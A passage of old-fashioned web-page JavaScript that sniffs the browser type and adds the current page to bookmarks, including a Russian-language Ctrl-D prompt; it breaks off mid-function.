<script type="text/javascript">
function browserInfo() 
{
    var type, version = undefined;

    if (window.opera)
        type = 'Opera';
    else if (document.all) 
    {
        type = 'IE';
        var nv = navigator.appVersion;
        var s = nv.indexOf('MSIE')+5;
        v = nv.substring(s,s+1);
    }
    else if (navigator.appName) 
        type = 'Netscape';
    var ua = navigator.userAgent;    
    if (ua.search(/Chrome/) > 0) type = 'Google Chrome';

    return { 'type': type, 'version': version};
}
 
function bookmark(a)
{
    var pageUrl = window.document.location;
    var pageTitle = window.document.title;
    var browser = browserInfo();

    if (browser.type == 'IE')
        window.external.AddFavorite(pageUrl, pageTitle);
    else if (browser.type == 'Opera') 
    {
        a.href = pageUrl;
        a.rel = 'sidebar';
        a.title = pageUrl + ',' + pageTitle;
    
        return true;
    }
    else if (browser.type == 'Netscape') {
		return true;
        alert('Нажмите, пожалуйста, Ctrl-D для добавления страницы в закладки'); }
